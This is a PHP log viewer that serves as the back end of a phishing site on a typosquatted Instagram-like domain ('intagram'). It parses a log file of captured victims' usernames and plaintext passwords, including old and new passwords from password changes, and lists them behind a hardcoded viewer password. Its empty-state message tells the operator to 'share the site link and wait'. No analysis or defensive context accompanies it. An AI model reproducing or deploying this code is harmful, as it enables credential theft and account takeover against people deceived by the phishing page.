<?php
/**
 * logs.php - Password-protected log viewer
 * Access at: https://intagram.infinityfreeapp.com/logs.php
 */

// ── Viewer password (change this to whatever you want) ──────────────────
define('VIEWER_PASSWORD', 'lucky@admin');

$authenticated = false;
$error         = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['pass']) && $_POST['pass'] === VIEWER_PASSWORD) {
        $authenticated = true;
    } else {
        $error = 'Wrong password. Try again.';
    }
}

$log_file = __DIR__ . '/my_login_log.txt';
$entries  = [];

if ($authenticated && file_exists($log_file)) {
    $lines = array_filter(array_map('trim', file($log_file)));
    foreach (array_reverse($lines) as $line) {
        // Parse: [timestamp] username="x" password="y"
        preg_match('/\[([^\]]+)\].*username="([^"]*)".*password="([^"]*)"/', $line, $m);
        if ($m) {
            $entries[] = [
                'time'     => $m[1],
                'username' => $m[2],
                'password' => $m[3],
                'type'     => 'LOGIN',
            ];
        } else {
            // Password change entries
            preg_match('/\[([^\]]+)\] PASSWORD_CHANGE old="([^"]*)" new="([^"]*)"/', $line, $p);
            if ($p) {
                $entries[] = [
                    'time'     => $p[1],
                    'username' => 'demo_user',
                    'password' => 'old: ' . $p[2] . ' → new: ' . $p[3],
                    'type'     => 'PW_CHANGE',
                ];
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>Login Log Viewer</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;}
  body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:40px 20px;}
  h1{font-size:22px;margin-bottom:4px;color:#58a6ff;}
  .sub{font-size:13px;color:#8b949e;margin-bottom:30px;}
  /* Login box */
  .login-box{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:36px 32px;width:100%;max-width:360px;margin-top:60px;}
  .login-box h2{font-size:18px;margin-bottom:18px;color:#f0f6fc;}
  .login-box input{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;margin-bottom:12px;outline:none;}
  .login-box input:focus{border-color:#58a6ff;}
  .login-box button{width:100%;padding:10px;background:#238636;border:none;border-radius:6px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;}
  .login-box button:hover{background:#2ea043;}
  .error{color:#f85149;font-size:13px;margin-bottom:10px;}
  /* Table */
  .header-row{display:flex;justify-content:space-between;align-items:center;width:100%;max-width:900px;margin-bottom:16px;}
  .badge{background:#21262d;border:1px solid #30363d;border-radius:20px;padding:4px 14px;font-size:13px;color:#8b949e;}
  .badge span{color:#58a6ff;font-weight:600;}
  table{width:100%;max-width:900px;border-collapse:collapse;background:#161b22;border-radius:10px;overflow:hidden;border:1px solid #30363d;}
  thead{background:#21262d;}
  th{padding:12px 16px;text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:0.8px;color:#8b949e;}
  td{padding:12px 16px;font-size:13px;border-top:1px solid #21262d;}
  tr:hover td{background:#1c2128;}
  .tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600;}
  .tag-login{background:#0d419d;color:#79c0ff;}
  .tag-pw{background:#3d2f00;color:#e3b341;}
  .pw-cell{font-family:monospace;color:#ff7b72;font-weight:600;}
  .user-cell{color:#56d364;font-weight:600;}
  .time-cell{color:#8b949e;font-size:12px;}
  .empty{color:#8b949e;text-align:center;padding:40px;font-size:14px;}
  .refresh{background:#21262d;border:1px solid #30363d;border-radius:6px;padding:6px 14px;color:#c9d1d9;font-size:13px;cursor:pointer;text-decoration:none;}
  .refresh:hover{background:#30363d;}
</style>
</head>
<body>

<?php if (!$authenticated): ?>
  <div class="login-box">
    <h2>🔐 Log Viewer</h2>
    <p style="font-size:13px;color:#8b949e;margin-bottom:18px;">Enter the viewer password to see captured login attempts.</p>
    <?php if ($error): ?>
      <div class="error">⚠ <?= htmlspecialchars($error) ?></div>
    <?php endif; ?>
    <form method="POST">
      <input type="password" name="pass" placeholder="Viewer password" autofocus/>
      <button type="submit">View Logs</button>
    </form>
  </div>

<?php else: ?>
  <h1>📋 Login Log Viewer</h1>
  <p class="sub">Live capture from intagram.infinityfreeapp.com — newest entries first</p>

  <div class="header-row">
    <div class="badge">Total captured: <span><?= count($entries) ?></span></div>
    <a class="refresh" href="logs.php" onclick="this.form&&this.form.submit()">↻ Refresh</a>
  </div>

  <form method="POST" style="display:none" id="rf">
    <input type="hidden" name="pass" value="<?= htmlspecialchars(VIEWER_PASSWORD) ?>"/>
  </form>

  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Type</th>
        <th>Timestamp</th>
        <th>Username</th>
        <th>Password Entered</th>
      </tr>
    </thead>
    <tbody>
      <?php if (empty($entries)): ?>
        <tr><td colspan="5" class="empty">No login attempts yet. Share the site link and wait! 👀</td></tr>
      <?php else: ?>
        <?php foreach ($entries as $i => $e): ?>
        <tr>
          <td style="color:#8b949e"><?= count($entries) - $i ?></td>
          <td>
            <?php if ($e['type'] === 'LOGIN'): ?>
              <span class="tag tag-login">LOGIN</span>
            <?php else: ?>
              <span class="tag tag-pw">PW CHANGE</span>
            <?php endif; ?>
          </td>
          <td class="time-cell"><?= htmlspecialchars($e['time']) ?></td>
          <td class="user-cell"><?= htmlspecialchars($e['username']) ?></td>
          <td class="pw-cell"><?= htmlspecialchars($e['password']) ?></td>
        </tr>
        <?php endforeach; ?>
      <?php endif; ?>
    </tbody>
  </table>
<?php endif; ?>

</body>
</html>
